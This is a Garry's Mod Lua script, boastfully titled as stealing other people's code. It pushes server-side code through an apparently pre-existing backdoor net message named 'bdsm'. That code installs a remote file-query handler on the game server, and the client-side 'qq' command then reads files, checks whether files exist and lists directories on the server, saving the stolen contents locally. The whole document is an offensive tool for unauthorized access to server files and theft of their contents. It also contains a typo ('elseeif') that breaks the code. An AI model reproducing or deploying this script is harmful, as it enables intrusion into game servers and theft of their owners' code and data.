--[GTL] I'M IN YOUR LUA! STEALING YOUR HAX...

	

    --quickquery
     
	net.Start("bdsm")
            net.WriteString([[
    util.AddNetworkString("quick_query")
     
    local function reply(p, msg)
            net.Start("quick_query")
                    net.WriteString(msg)
            net.Send(p)
    end
     
    net.Receive(
            "quick_query",
            function(l, p)
                    local args = net.ReadTable()
                   
                    local com = args[1]
                    local fil = args[2]
                    local dir = args[3]
                   
                    if (com == "FILE_EXISTS") then
                            local fex = file.Exists(fil, dir)
                            reply(p, fil .. " does" .. (fex && "" || "n't") .. " exist.")
                    elseeif (com == "FILE_GET") then
                            local cnt = file.Read(fil, dir)
                            reply(p, "--" .. dir .. "/" .. fil .. "\n\n" .. cnt)
                    elseif (com == "DIR_CONTENT") then
                            local dirc = ""
                            local dirf, dird = file.Find(fil, dir)
                            for _, diri in pairs(dirf) do
                                    dirc = dirc .. diri .. "\n"
                            end
                            for _, diri in pairs(dird) do
                                    dirc = dirc .. diri .. "\n"
                            end
                           
                            reply(p, "files in " .. fil .. "\n\n" .. dirc)
                    end
            end
    )
            ]])
    net.SendToServer()
     
    concommand.Add(
            "qq",
            function(p, c, args, full)
                    local args = {
                            (args[1] || "FILE_EXISTS"),
                            (args[2] || "lua/functiondump.lua"),
                            (args[3] || "MOD")
                    }
                   
                    net.Start("quick_query")
                            net.WriteTable(args)
                    net.SendToServer()
            end
    )
     
    net.Receive(
            "quick_query",
            function(l)
                    local srep = net.ReadString()
                   
                    print(srep)
                    file.Write("qq-rep.txt", srep)
            end
    )

